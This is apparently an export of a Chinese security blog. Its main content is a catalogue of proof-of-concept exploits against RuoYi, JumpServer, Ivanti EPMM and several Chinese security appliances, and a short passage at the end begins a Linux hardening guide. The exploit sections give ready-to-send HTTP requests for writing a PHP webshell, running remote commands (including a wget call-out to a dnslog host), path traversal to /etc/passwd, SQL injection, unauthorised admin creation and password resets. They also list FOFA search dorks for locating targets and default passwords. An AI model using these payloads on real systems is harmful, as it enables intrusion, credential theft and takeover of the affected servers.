<p><a href="https://mp.weixin.qq.com/s/x_-N6YVzJW-INbJ02y_qVQ">https://mp.weixin.qq.com/s/x_-N6YVzJW-INbJ02y_qVQ</a></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /monitor/job/add HTTP/1.1</span><br><span class="line">Host: 192.168.124.6</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Content-Length: 84</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: JSESSIONID=0655e330-b04f-4487-8617-715d58f2a82c</span><br><span class="line">Origin: http://192.168.124.6</span><br><span class="line">Referer: http://192.168.124.6/monitor/job</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line"></span><br><span class="line">createBy=admin&amp;jobName=renwu&amp;jobGroup=DEFAULT&amp;invokeTarget=ruoYiConfig.setProfile(<span class="string">&#x27;xxx/RuoYi/upload/123.txt&#x27;</span>)&amp;cronExpression=0%2F15+*+*+*+*+%3F&amp;misfirePolicy=1&amp;concurrent=1&amp;status=0&amp;remark=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET /common/download/resource?resource=xxxx.yaml;.zip HTTP/1.1</span><br><span class="line">Host: 192.168.124.6</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Cookie: JSESSIONID=0655e330-b04f-4487-8617-715d58f2a82c</span><br><span class="line">Referer: http://192.168.124.6/index</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST /monitor/job/add HTTP/1.1</span><br><span class="line">Host: 192.168.124.6</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Content-Length: 84</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: JSESSIONID=b99110bd-0cb2-44b8-a2e8-880d2082b81d</span><br><span class="line">Origin: http://192.168.124.6</span><br><span class="line">Referer: http://192.168.124.6/monitor/job</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line"></span><br><span class="line">createBy=admin&amp;jobName=renwu&amp;jobGroup=DEFAULT&amp;invokeTarget=ruoYiConfig.setProfile(<span class="string">&#x27;xxxx/RuoYi/upload&#x27;</span>)&amp;cronExpression=0%2F15+*+*+*+*+%3F&amp;misfirePolicy=1&amp;concurrent=1&amp;status=0&amp;remark=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET /common/download/resource?resource=/profile/123.txt HTTP/1.1</span><br><span class="line">Host: 192.168.124.6</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Cookie: JSESSIONID=b99110bd-0cb2-44b8-a2e8-880d2082b81d</span><br><span class="line">Referer: http://192.168.124.6/index</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="eyoucms绕过后台登录"><a href="#eyoucms绕过后台登录" class="headerlink" title="eyoucms绕过后台登录"></a>eyoucms绕过后台登录</h3><p>访问网站获取自己的session，然后脚本跑一下， 使用跑出来的值就可以绕过后台登录</p>
<p>D:\soft\py_project\POC\eyoucms绕过后台登录.py</p>
<h3 id="JumpServer"><a href="#JumpServer" class="headerlink" title="JumpServer"></a>JumpServer</h3><h4 id="目录遍历穿越漏洞"><a href="#目录遍历穿越漏洞" class="headerlink" title="目录遍历穿越漏洞"></a>目录遍历穿越漏洞</h4><blockquote>
<p>需登录 ！！！   登录用户可以访问和修改系统上任何文件的内容</p>
<p>CVE-2023-42819  </p>
</blockquote>
<h5 id="影响版本-3"><a href="#影响版本-3" class="headerlink" title="影响版本"></a>影响版本</h5><p>3.0.0 - 3.6.4</p>
<h5 id="poc-6"><a href="#poc-6" class="headerlink" title="poc"></a>poc</h5><p>用户“foo”单击“作业模板”菜单并创建名为“test”的剧本。从详细信息页面获取剧本 ID，例如“e0adabef-c38f-492d-bd92-832bacc3df5f”。攻击者可以使用提供的 URL 进行目录遍历</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://jumpserver-ip/api/v1/ops/playbook/e0adabef-c38f-492d-bd92-832bacc3df5f/file/?key=../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>



<h4 id="任意密码重置"><a href="#任意密码重置" class="headerlink" title="任意密码重置"></a>任意密码重置</h4><blockquote>
<p>CVE-2023-42820  </p>
</blockquote>
<h5 id="影响版本-4"><a href="#影响版本-4" class="headerlink" title="影响版本"></a>影响版本</h5><p>2.24 - 3.6.4</p>
<p>由于第三方库向 API 公开随机数种子，可能允许重播随机生成的验证码，这可能导致密码重置</p>
<p><a href="https://github.com/jumpserver/jumpserver/security/advisories/GHSA-7prv-g565-82qp">https://github.com/jumpserver/jumpserver/security/advisories/GHSA-7prv-g565-82qp</a></p>
<h4 id="未授权访问-1"><a href="#未授权访问-1" class="headerlink" title="未授权访问"></a>未授权访问</h4><blockquote>
<p>CVE-2023-42442</p>
</blockquote>
<h5 id="影响版本-5"><a href="#影响版本-5" class="headerlink" title="影响版本"></a>影响版本</h5><p>&lt;&#x3D;3.5.5</p>
<h5 id="poc-7"><a href="#poc-7" class="headerlink" title="poc"></a>poc</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /api/v1/terminal/sessions/ HTTP/1.1</span><br><span class="line">Host: &#123;&#123;Hostname&#125;&#125;</span><br><span class="line">Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Cookie: jms_csrftoken=7jey7HadfzOeWIPuaS9y3RjwrlfamxlRN6oigeqCeg8Tkcl3QdvbUUd3Hs5aZa8q; SESSION_COOKIE_NAME_PREFIX=jms_; jms_public_key=&quot;LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FEWUlIL2g5REszNFFEZlpWcjdISHpYSTRsLwozLzdEOVlsWEYrQjdxOW1rM3R4RjF0bk53WWNLbUQrQjBsVFVxYjZiTWVnMjRWeW9mM0o3L1hMNHpvUFhZNFp1CkgxZmc2Zk9vbXBxUUptemFsTGY5ZEJXdHBmd1pUVW1MejZpZlhRTDA3QkxYZWRIeXVPZHlyZU1ELzRlWU40OUkKNk9ZMWsvQTNKVGw0eG5TWjRRSURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ==&quot;; jms_sessionid=z62zrdkzk7rfjldmbrymv8ol5v5q4tud</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="EPMM"><a href="#EPMM" class="headerlink" title="EPMM"></a>EPMM</h3><h4 id="未授权API-访问更改-CVE-2023-35078"><a href="#未授权API-访问更改-CVE-2023-35078" class="headerlink" title="未授权API 访问更改(CVE-2023-35078)"></a>未授权API 访问更改(CVE-2023-35078)</h4><p>中发现了 CVE-2023-35078 远程未经身份验证的 API 访问漏洞。此漏洞影响所有受支持的版本 - 版本 11.4 发布 11.10、11.9 和 11.8。旧版本&#x2F;版本也面临风险。此漏洞使未经授权的远程（面向互联网）攻击者能够访问用户的个人身份信息并对服务器进行有限的更改。</p>
<p>影响版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Ivanti Endpoint Manager Mobile 11.10</span><br><span class="line">Ivanti Endpoint Manager Mobile 11.9</span><br><span class="line">Ivanti Endpoint Manager Mobile 11.8</span><br><span class="line">不受支持的旧版本也会受到影响</span><br></pre></td></tr></table></figure>

<p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">icon_hash=&quot;967636089&quot;</span><br></pre></td></tr></table></figure>

<p>poc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/vchan-in/CVE-2023-35078-Exploit-POC</span><br></pre></td></tr></table></figure>

<p>官方补丁</p>
<p><a href="https://forums.ivanti.com/s/article/CVE-2023-35078-Remote-unauthenticated-API-access-vulnerability?language=en_US">https://forums.ivanti.com/s/article/CVE-2023-35078-Remote-unauthenticated-API-access-vulnerability?language=en_US</a></p>
<p><a href="https://forums.ivanti.com/s/article/KB-Remote-unauthenticated-API-access-vulnerability-CVE-2023-35078">https://forums.ivanti.com/s/article/KB-Remote-unauthenticated-API-access-vulnerability-CVE-2023-35078</a></p>
<h2 id="安全厂商"><a href="#安全厂商" class="headerlink" title="安全厂商"></a>安全厂商</h2><h3 id="安恒"><a href="#安恒" class="headerlink" title="安恒"></a>安恒</h3><h4 id="明御运维审计与风险控制系统-xmlrpc-sock-任意用户添加漏洞"><a href="#明御运维审计与风险控制系统-xmlrpc-sock-任意用户添加漏洞" class="headerlink" title="明御运维审计与风险控制系统 xmlrpc.sock 任意用户添加漏洞"></a>明御运维审计与风险控制系统 xmlrpc.sock 任意用户添加漏洞</h4><p>漏洞描述</p>
<blockquote>
<p>安恒 明御运维审计与风险控制系统 xmlrpc.sock 接口存在SSRF漏洞，通过漏洞可以添加任意用户控制堡垒机</p>
</blockquote>
<p>fofa</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;明御运维审计与风险控制系统&quot;</span><br></pre></td></tr></table></figure>

<p>poc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc HTTP/1.1</span><br><span class="line">Host: </span><br><span class="line">Cookie: LANG=zh; DBAPPUSM=ee4bbf6c85e541bb980ad4e0fbee2f57bb15bafe20a7028af9a0b8901cf80fd3</span><br><span class="line">Content-Length: 1117</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Sec-Ch-Ua: &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;100&quot;, &quot;Google Chrome&quot;;v=&quot;100&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;  </span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line">&lt;methodName&gt;web.user_add&lt;/methodName&gt;</span><br><span class="line">&lt;params&gt;</span><br><span class="line">&lt;param&gt;</span><br><span class="line">&lt;value&gt;</span><br><span class="line">&lt;array&gt;</span><br><span class="line">&lt;data&gt;</span><br><span class="line">&lt;value&gt;</span><br><span class="line">&lt;string&gt;admin&lt;/string&gt;</span><br><span class="line">&lt;/value&gt;</span><br><span class="line">&lt;value&gt;</span><br><span class="line">&lt;string&gt;5&lt;/string&gt;</span><br><span class="line">&lt;/value&gt;</span><br><span class="line">&lt;value&gt;</span><br><span class="line">&lt;string&gt;10.0.0.1&lt;/string&gt;</span><br><span class="line">&lt;/value&gt;</span><br><span class="line">&lt;/data&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;/value&gt;</span><br><span class="line">&lt;/param&gt;</span><br><span class="line">&lt;param&gt;</span><br><span class="line">&lt;value&gt;</span><br><span class="line">&lt;struct&gt;</span><br><span class="line">&lt;member&gt;</span><br><span class="line">&lt;name&gt;uname&lt;/name&gt;</span><br><span class="line">&lt;value&gt;</span><br><span class="line">&lt;string&gt;test&lt;/string&gt;</span><br><span class="line">&lt;/value&gt;</span><br><span class="line">&lt;/member&gt;</span><br><span class="line">&lt;member&gt;</span><br><span class="line">&lt;name&gt;name&lt;/name&gt;</span><br><span class="line">&lt;value&gt;</span><br><span class="line">&lt;string&gt;test&lt;/string&gt;</span><br><span class="line">&lt;/value&gt;</span><br><span class="line">&lt;/member&gt;</span><br><span class="line">&lt;member&gt;</span><br><span class="line">&lt;name&gt;pwd&lt;/name&gt;</span><br><span class="line">&lt;value&gt;</span><br><span class="line">&lt;string&gt;1qaz@3edC12345&lt;/string&gt;</span><br><span class="line">&lt;/value&gt;</span><br><span class="line">&lt;/member&gt;</span><br><span class="line">&lt;member&gt;</span><br><span class="line">&lt;name&gt;authmode&lt;/name&gt;</span><br><span class="line">&lt;value&gt;</span><br><span class="line">&lt;string&gt;1&lt;/string&gt;</span><br><span class="line">&lt;/value&gt;</span><br><span class="line">&lt;/member&gt;</span><br><span class="line">&lt;member&gt;</span><br><span class="line">&lt;name&gt;deptid&lt;/name&gt;</span><br><span class="line">&lt;value&gt;</span><br><span class="line">&lt;string&gt;&lt;/string&gt;</span><br><span class="line">&lt;/value&gt;</span><br><span class="line">&lt;/member&gt;</span><br><span class="line">&lt;member&gt;</span><br><span class="line">&lt;name&gt;email&lt;/name&gt;</span><br><span class="line">&lt;value&gt;</span><br><span class="line">&lt;string&gt;&lt;/string&gt;</span><br><span class="line">&lt;/value&gt;</span><br><span class="line">&lt;/member&gt;</span><br><span class="line">&lt;member&gt;</span><br><span class="line">&lt;name&gt;mobile&lt;/name&gt;</span><br><span class="line">&lt;value&gt;</span><br><span class="line">&lt;string&gt;&lt;/string&gt;</span><br><span class="line">&lt;/value&gt;</span><br><span class="line">&lt;/member&gt;</span><br><span class="line">&lt;member&gt;</span><br><span class="line">&lt;name&gt;comment&lt;/name&gt;</span><br><span class="line">&lt;value&gt;</span><br><span class="line">&lt;string&gt;&lt;/string&gt;</span><br><span class="line">&lt;/value&gt;</span><br><span class="line">&lt;/member&gt;</span><br><span class="line">&lt;member&gt;</span><br><span class="line">&lt;name&gt;roleid&lt;/name&gt;</span><br><span class="line">&lt;value&gt;</span><br><span class="line">&lt;string&gt;102&lt;/string&gt;</span><br><span class="line">&lt;/value&gt;</span><br><span class="line">&lt;/member&gt;</span><br><span class="line">&lt;/struct&gt;&lt;/value&gt;</span><br><span class="line">&lt;/param&gt;</span><br><span class="line">&lt;/params&gt;</span><br><span class="line">&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure>



<h4 id="安恒明御安全网关rce"><a href="#安恒明御安全网关rce" class="headerlink" title="安恒明御安全网关rce"></a>安恒明御安全网关rce</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HTTP</span><br><span class="line">GET /webui/?g-aaa portal_auth_local_submit&amp;bkg_flag=0&amp;<span class="variable">$type</span>=1&amp;suffix=1|<span class="built_in">echo</span>+<span class="string">&quot;&lt;%3fphp+eval(\$_POST[\&quot;a\&quot;]);?&gt;&quot;</span>+&gt;+.lib.php HTTP/1.1</span><br><span class="line">Host:xxX</span><br><span class="line">Cookie: USGSESSID=495b895ddd42b82cd89a29f241825081</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac 0S X 10 16 0) AppleWebkit/537.36 (KHTML, likeGecko) Chrome/78.0.3904.108 safar/537.36</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Accept:</span><br><span class="line">text/html,application/xhtml+xml,application/xml;g=0.9,image/webp,image/apng,*/*;g=0.8,application/signed-exchange;v=b3</span><br><span class="line">sec-Fetch-site: none</span><br><span class="line">sec-Fetch-Mode: navigate</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-Language: zh-CN,zh;g=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell: http://xxx/webui/.lib.php</span><br></pre></td></tr></table></figure>







<h3 id="绿盟"><a href="#绿盟" class="headerlink" title="绿盟"></a>绿盟</h3><h4 id="BAS日志数据安全性分析系统-accountmanage-未授权访问漏洞"><a href="#BAS日志数据安全性分析系统-accountmanage-未授权访问漏洞" class="headerlink" title="BAS日志数据安全性分析系统 accountmanage 未授权访问漏洞"></a>BAS日志数据安全性分析系统 accountmanage 未授权访问漏洞</h4><p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">body=&quot;WebApi/encrypt/js-sha1/build/sha1.min.js&quot;</span><br></pre></td></tr></table></figure>

<p>未授权页面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/accountmanage/index</span><br></pre></td></tr></table></figure>

<p>访问，添加用户直接登录</p>
<h4 id="UTS综合威胁探针-信息泄露登陆绕过漏洞"><a href="#UTS综合威胁探针-信息泄露登陆绕过漏洞" class="headerlink" title="UTS综合威胁探针 信息泄露登陆绕过漏洞"></a>UTS综合威胁探针 信息泄露登陆绕过漏洞</h4><blockquote>
<p>绿盟 UTS综合威胁探针 某个接口未做授权导致未授权漏洞</p>
</blockquote>
<h5 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;NSFOCUS-UTS综合威胁探针&quot;</span><br></pre></td></tr></table></figure>

<h5 id="poc-8"><a href="#poc-8" class="headerlink" title="poc"></a>poc</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/webapi/v1/system/accountmanage/account</span><br></pre></td></tr></table></figure>

<p>可以看到账号和加密后的密码，登录的时候抓包替换</p>
<h5 id="默认口令"><a href="#默认口令" class="headerlink" title="默认口令"></a>默认口令</h5><p>admin&#x2F;Nsfocus@123</p>
<p>auditor&#x2F;auditor</p>
<h4 id="SAS堡垒机-Exec-远程命令执行漏洞"><a href="#SAS堡垒机-Exec-远程命令执行漏洞" class="headerlink" title="SAS堡垒机 Exec 远程命令执行漏洞"></a>SAS堡垒机 Exec 远程命令执行漏洞</h4><p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">body=&quot;&#x27;/needUsbkey.php?username=&#x27;&quot;</span><br></pre></td></tr></table></figure>

<p>poc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/webconf/Exec/index?cmd=wget%20xxx.dnslog.cn</span><br></pre></td></tr></table></figure>





<h4 id="SAS堡垒机-local-user-php-任意用户登录漏洞"><a href="#SAS堡垒机-local-user-php-任意用户登录漏洞" class="headerlink" title="SAS堡垒机 local_user.php 任意用户登录漏洞"></a>SAS堡垒机 local_user.php 任意用户登录漏洞</h4><blockquote>
<p>绿盟堡垒机存在任意用户登录漏洞，攻击者通过漏洞包含 www&#x2F;local_user.php 实现任意⽤户登录</p>
</blockquote>
<p>fofa语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">body=&quot;&#x27;/needUsbkey.php?username=&#x27;&quot;</span><br></pre></td></tr></table></figure>

<p>poc</p>
<p>get请求头添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&amp;method=login&amp;user_account=admin</span><br></pre></td></tr></table></figure>

<h4 id="SAS堡垒机-GetFile-任意文件读取漏洞"><a href="#SAS堡垒机-GetFile-任意文件读取漏洞" class="headerlink" title="SAS堡垒机 GetFile 任意文件读取漏洞"></a>SAS堡垒机 GetFile 任意文件读取漏洞</h4><blockquote>
<p>绿盟堡垒机存在任意用户登录漏洞，攻击者通过漏洞包含 www&#x2F;local_user.php 实现任意⽤户登录</p>
</blockquote>
<p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">body=&quot;&#x27;/needUsbkey.php?username=&#x27;&quot;</span><br></pre></td></tr></table></figure>



<p>poc</p>
<p>get请求添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>



<h3 id="深信服"><a href="#深信服" class="headerlink" title="深信服"></a>深信服</h3><h4 id="应用交付管理系统-login-远程命令执行漏洞"><a href="#应用交付管理系统-login-远程命令执行漏洞" class="headerlink" title="应用交付管理系统 login 远程命令执行漏洞"></a>应用交付管理系统 login 远程命令执行漏洞</h4><blockquote>
<p>深信服 应用交付管理系统 login 存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限，执行任意命令</p>
</blockquote>
<p>版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">深信服 应用交付管理系统 7.0.8-7.0.8R5</span><br></pre></td></tr></table></figure>

<p>网络测绘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fid=&quot;iaytNA57019/kADk8Nev7g==&quot;</span><br></pre></td></tr></table></figure>

<p>poc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /rep/login </span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Length: 118</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">clsMode=cls_mode_login%0Als%0A&amp;index=index&amp;log_type=report&amp;loginType=account&amp;page=login&amp;rnd=0&amp;userID=admin&amp;userPsw=123</span><br></pre></td></tr></table></figure>

<h3 id="奇安信"><a href="#奇安信" class="headerlink" title="奇安信"></a>奇安信</h3><h4 id="网神-SecSSL-3600安全接入网关系统-未授权访问漏洞"><a href="#网神-SecSSL-3600安全接入网关系统-未授权访问漏洞" class="headerlink" title="网神 SecSSL 3600安全接入网关系统 未授权访问漏洞"></a>网神 SecSSL 3600安全接入网关系统 未授权访问漏洞</h4><p>网络测绘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;安全接入网关SecSSLVPN&quot; </span><br></pre></td></tr></table></figure>

<p>poc</p>
<p>获取用户列表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /admin/group/x_group.php?id=2</span><br><span class="line"></span><br><span class="line">Cookie: admin_id=1; gw_admin_ticket=1;</span><br></pre></td></tr></table></figure>

<p>修改用户密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /changepass.php?<span class="built_in">type</span>=2 </span><br><span class="line"></span><br><span class="line">Cookie: admin_id=1; gw_user_ticket=ffffffffffffffffffffffffffffffff; last_step_param=&#123;<span class="string">&quot;this_name&quot;</span>:<span class="string">&quot;ceshi&quot;</span>,<span class="string">&quot;subAuthId&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">old_pass=&amp;password=Asd123!@<span class="comment">#123A&amp;repassword=Asd123!@#123A</span></span><br></pre></td></tr></table></figure>

<h3 id="辰信领创"><a href="#辰信领创" class="headerlink" title="辰信领创"></a>辰信领创</h3><h4 id="辰信景云终端安全管理系统-login-SQL注入漏洞"><a href="#辰信景云终端安全管理系统-login-SQL注入漏洞" class="headerlink" title="辰信景云终端安全管理系统 login SQL注入漏洞"></a>辰信景云终端安全管理系统 login SQL注入漏洞</h4><blockquote>
<p>辰信领创 辰信景云终端安全管理系统 login存在 SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息</p>
</blockquote>
<p>网络测绘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;辰信景云终端安全管理系统&quot;</span><br></pre></td></tr></table></figure>



<p>poc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/user/login</span><br><span class="line"></span><br><span class="line">captcha=&amp;password=21232f297a57a5a743894a0e4a801fc3&amp;username=admin&#x27;and(select*from(select+sleep(3))a)=&#x27;</span><br></pre></td></tr></table></figure>







]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>加固和应急响应</title>
    <url>/2023/06/16/%E5%8A%A0%E5%9B%BA%E5%92%8C%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
    <content><![CDATA[<h4 id="加固"><a href="#加固" class="headerlink" title="加固"></a>加固</h4><p>国标</p>
<p>GB&#x2F;T25058 信息安全技术 信息系统安全等级保护实施指南</p>
<p>GB&#x2F;T22240 信息安全技术 信息系统安全等级保护定级指南</p>
<p>GB&#x2F;T22239 信息安全技术 网络安全等级保护基本要求</p>
<p>GB&#x2F;T25070 信息安全技术 网络安全等级保护安全设计技术要求</p>
<p>GB&#x2F;T28449 信息安全技术  网络安全等级保护评测过程指南</p>
<h5 id="版本升级"><a href="#版本升级" class="headerlink" title="版本升级"></a>版本升级</h5><p>windows有弹框，linux没提示</p>
<h5 id="关闭端口服务"><a href="#关闭端口服务" class="headerlink" title="关闭端口服务"></a>关闭端口服务</h5><p>端口能不开就不开，最小安装原则</p>
<h5 id="修改配置项"><a href="#修改配置项" class="headerlink" title="修改配置项"></a>修改配置项</h5><p>修改安全配置，参数，可以为网络和 应用提供必要的安全防护</p>
<h5 id="主机和网络ACL策略"><a href="#主机和网络ACL策略" class="headerlink" title="主机和网络ACL策略"></a>主机和网络ACL策略</h5><p>iptables,对于流量进行严格的控制，白名单</p>
<h5 id="修改代码"><a href="#修改代码" class="headerlink" title="修改代码"></a>修改代码</h5><h5 id="部署设备防护"><a href="#部署设备防护" class="headerlink" title="部署设备防护"></a>部署设备防护</h5><h4 id="linux加固方向"><a href="#linux加固方向" class="headerlink" title="linux加固方向"></a>linux加固方向</h4><h5 id="账号管理和认证授权"><a href="#账号管理和认证授权" class="headerlink" title="账号管理和认证授权"></a>账号管理和认证授权</h5><h6 id="修改目录权限"><a href="#修改目录权限" class="headerlink" title="修改目录权限"></a>修改目录权限</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 750 directory</span><br><span class="line"><span class="comment"># 默认目录权限是755   文件权限是644</span></span><br><span class="line"><span class="comment"># 改为750 640或者 700 600 </span></span><br><span class="line"><span class="built_in">chown</span> username:groupname directory</span><br><span class="line"></span><br><span class="line"><span class="comment">#更改账户组文件的权限</span></span><br><span class="line"><span class="built_in">chmod</span> 644 /etc/passwd</span><br><span class="line"><span class="built_in">chmod</span> 600 /etc/shadow</span><br><span class="line"><span class="built_in">chmod</span> 644 /etc/group</span><br><span class="line"><span class="comment">#去除多余的写入操作  全改</span></span><br><span class="line"><span class="built_in">chmod</span> -R go-w /etc</span><br></pre></td></tr></table></figure>

<p>visudo</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#visudo中  !以后的为不允许使用该命令</span></span><br><span class="line">username   host=/usr/sbin/useradd, !/usr/bin/vim /etc/hosts,!/usr/bin/passwd root</span><br></pre></td></tr></table></figure>

<p>检查高权限文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.find / -type f \( -perm -00007 \) -a -ctime -1 -exec ls -lg &#123;&#125; \;</span><br><span class="line">ctime -1 :一天内状态改变过的项</span><br><span class="line">mtime:内容修改</span><br><span class="line">atime:被访问</span><br></pre></td></tr></table></figure>

